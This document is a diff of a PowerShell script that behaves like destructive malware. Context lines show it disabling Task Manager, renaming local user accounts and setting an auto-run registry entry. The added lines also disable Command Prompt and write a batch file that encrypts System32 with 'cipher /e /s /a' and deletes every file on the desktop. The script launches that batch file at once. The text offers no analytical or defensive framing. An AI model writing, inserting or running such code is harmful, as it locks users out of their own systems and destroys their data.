@@ -32,6 +32,11 @@ $disableTaskMgrPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\
 New-Item -Path $disableTaskMgrPath -Force | Out-Null
 Set-ItemProperty -Path $disableTaskMgrPath -Name "DisableTaskMgr" -Value 1
 
+# Create registry key to disable Command Prompt
+$disableCmdPath = "HKCU:\Software\Policies\Microsoft\Windows\System"
+New-Item -Path $disableCmdPath -Force | Out-Null
+Set-ItemProperty -Path $disableCmdPath -Name "DisableCMD" -Value 1
+
 # Create registry key to disable Search Bar in taskbar
 $searchBarPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search"
 New-Item -Path $searchBarPath -Force | Out-Null
@@ -44,13 +49,14 @@ foreach ($user in $users) {
     Rename-LocalUser -Name $user.Name -NewName $newName
 }
 
-# Create batch file to auto-execute the script
+# Create batch file to run a specific line of code
 $batchFilePath = Join-Path -Path $desktopPath -ChildPath "AutoExecute.bat"
-$scriptPath = $MyInvocation.MyCommand.Path
-$batchFileContent = @"
-@echo off
-powershell.exe -ExecutionPolicy Bypass -File "$scriptPath"
-"@
+$lineOfCode = 'REM Encrypt files in system32 using a random key
+cd C:\Windows\System32
+cipher /e /s /a
+REM Delete all icons on the desktop
+del %userprofile%\desktop\*.* /s /q'
+$batchFileContent = "@echo off`n$lineOfCode"
 
 $batchFileContent | Out-File -FilePath $batchFilePath -Encoding ASCII
 
@@ -62,6 +68,7 @@ Set-ItemProperty -Path $regKeyPath -Name $regKeyName -Value $regKeyValue
 
 # Start the batch file immediately
 Start-Process -FilePath $batchFilePath
+
 
 $source = @"
 using System;
